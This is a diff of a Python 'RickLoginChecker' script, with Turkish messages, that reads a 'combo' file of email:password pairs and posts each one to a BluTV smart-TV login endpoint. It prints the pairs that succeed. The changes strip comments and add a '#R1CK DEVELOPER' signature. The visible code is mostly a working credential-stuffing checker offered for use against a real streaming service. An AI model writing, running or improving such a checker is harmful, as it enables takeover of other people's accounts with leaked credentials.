@@ -26,14 +26,12 @@ class RickLoginChecker:
         data = f"username={email}&password={password}&platform=com.blu.smarttv"
         response = requests.post(self.url, data=data, headers=self.headers)
         
-        # API yanıtını JSON formatında almak
         try:
-            response_json = response.json()  # Yanıtı JSON olarak alıyoruz
+            response_json = response.json()
         except ValueError:
             print(f"\033[1;31mYanıt JSON formatında değil ❌: {email}:{password}")
             return
 
-        # Yanıtın 'status' ve 'user' alanlarına göre kontrol yapıyoruz
         if response_json.get("status") == "ok" and response_json.get("user", {}).get("OK"):
             print(f"\033[2;32mBaşarılı Giriş ✅: {email}:{password}")
         else:
@@ -45,7 +43,6 @@ class RickLoginChecker:
                 email, password = line.strip().split(":")
                 self.login_check(email, password)
 
-# Başlangıç mesajı
 output = render('    RICK     BLU TV ', colors=['white', 'blue'], align='center')
 print(output)
 
@@ -53,3 +50,4 @@ combo_yolu = input("\033[2;35mCombo Yolu: ")
 
 checker = RickLoginChecker()
 checker.rick_tool_from_file(combo_yolu)
+#R1CK DEVELOPER
